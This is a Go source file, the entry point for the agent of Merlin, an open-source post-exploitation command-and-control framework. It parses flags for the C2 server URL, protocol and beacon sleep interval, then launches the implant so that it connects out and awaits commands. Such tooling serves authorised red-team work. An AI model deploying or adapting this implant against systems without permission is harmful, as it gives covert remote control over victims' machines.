// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"flag"
	"fmt"
	"os"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/agent"
)

// GLOBAL VARIABLES
var url = "https://127.0.0.1:443"
var build = "nonRelease"

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	protocol := flag.String("proto", "h2", "Protocol for the agent to connect with [h2, hq]")
	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
		os.Exit(0)
	}

	// Setup and run agent
	a := agent.New(*protocol, *verbose, *debug)
	a.WaitTime = *sleep
	a.Run(url)
}

// usage prints command line options
func usage() {
	fmt.Printf("Merlin Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
